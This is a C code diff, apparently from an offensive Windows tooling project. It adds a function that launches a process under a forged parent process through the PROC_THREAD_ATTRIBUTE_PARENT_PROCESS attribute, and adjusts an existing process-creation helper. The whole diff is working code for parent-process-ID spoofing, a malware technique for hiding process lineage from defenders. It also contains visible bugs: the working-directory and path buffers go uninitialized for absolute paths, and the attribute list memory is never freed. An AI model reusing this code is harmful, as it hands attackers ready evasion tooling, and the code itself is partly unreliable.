@@ -553,9 +553,12 @@ BOOL RunProcess(IN DWORD dwCreationFlag, IN LPCSTR lpProcessName, OUT HANDLE* hP
 
 	Si.cb = sizeof(STARTUPINFO);
 
-	if (!GetEnvironmentVariableA("WINDIR", winDir, MAX_PATH * 2))
-		return ReportErrorWinAPI("GetEnvironmentVariableA");
-	sprintf_s(ProcessPath, MAX_PATH * 4, "%s\\System32\\%s", winDir, lpProcessName);
+	if (!IsAbsolutePath(lpProcessName))
+	{
+		if (!GetEnvironmentVariableA("WINDIR", winDir, MAX_PATH * 2))
+			return ReportErrorWinAPI("GetEnvironmentVariableA");
+		sprintf_s(ProcessPath, MAX_PATH * 4, "%s\\System32\\%s", winDir, lpProcessName);
+	}
 
 	printf("[i] Creating process %s\n", ProcessPath);
 	if (!CreateProcessA(
@@ -575,6 +578,69 @@ BOOL RunProcess(IN DWORD dwCreationFlag, IN LPCSTR lpProcessName, OUT HANDLE* hP
 	*hProcess = Pi.hProcess;
 	*hThread = Pi.hThread;
 	*dwProcessId = Pi.dwProcessId;
+
+	return TRUE;
+}
+
+BOOL RunPPIDSpoofedProcess(IN LPCSTR lpProcessName, IN LPCSTR lpParentProcessName, OUT HANDLE* hProcess, OUT HANDLE* hThread)
+{
+	HANDLE hParentProcess;
+	DWORD dwParentProcessId;
+	PROCESS_INFORMATION Pi = { 0 };
+	STARTUPINFOEXA SiEx = { 0 };
+	char ProcessPath[MAX_PATH * 4];
+	char winDir[MAX_PATH * 2];
+	char System32[MAX_PATH * 2];
+	SIZE_T sThreadAttList;
+	PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList;
+
+	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+
+	// Append C:\\Windows\\System32 to the relative process name
+	if (PathIsRelativeA(lpProcessName))
+	{
+		if (!GetEnvironmentVariableA("WINDIR", winDir, MAX_PATH * 2))
+			return ReportErrorWinAPI("GetEnvironmentVariableA");
+		sprintf_s(System32, MAX_PATH * 2, "%s\\System32", winDir);
+		sprintf_s(ProcessPath, MAX_PATH * 4, "%s\\%s", System32, lpProcessName);
+		lpProcessName = ProcessPath;
+	}
+
+	if (!ObtainProcessHandle(ENUMPROCESSES, lpParentProcessName, &hParentProcess, &dwParentProcessId))
+		return FALSE;
+
+	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
+
+	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
+
+	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList))
+		return ReportErrorWinAPI("InitializeProcThreadAttributeList");
+
+	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL))
+		return ReportErrorWinAPI("UpdateProcThreadAttribute");
+
+	SiEx.lpAttributeList = pThreadAttList;
+
+	if (!CreateProcessA(
+		NULL,
+		lpProcessName,
+		NULL,
+		NULL,
+		FALSE,
+		EXTENDED_STARTUPINFO_PRESENT,
+		NULL,
+		System32,
+		&SiEx.StartupInfo,
+		&Pi
+	))
+		return ReportErrorWinAPI("CreateProcessA");
+	printf("[i] Created process %s with PID %d with spoofed parent process %s\n", ProcessPath, Pi.dwProcessId, lpParentProcessName);
+
+	DeleteProcThreadAttributeList(pThreadAttList);
+	CloseHandle(hParentProcess);
+
+	*hProcess = Pi.hProcess;
+	*hThread = Pi.hThread;
 
 	return TRUE;
 }
